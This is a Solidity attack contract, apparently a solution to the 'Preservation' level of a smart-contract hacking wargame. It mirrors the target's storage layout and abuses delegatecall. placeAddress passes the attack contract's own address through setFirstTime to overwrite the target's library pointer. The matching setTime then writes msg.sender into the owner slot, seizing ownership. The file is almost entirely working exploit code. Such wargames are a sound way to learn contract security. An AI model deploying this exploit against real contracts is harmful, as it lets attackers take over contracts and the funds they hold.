// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Preservation.sol";

contract PreservationAttack {

    address public firstSlotAddress;
    address public secondSlotAddress;
    address public owner;
    Preservation preservationContract;

    constructor(address _address) public{
      preservationContract = Preservation(_address);
    }


    function setTime(uint256 _time) public{
      owner = msg.sender;
    }

    function placeAddress() external{
      preservationContract.setFirstTime(uint160(address(this)));    
    }


}

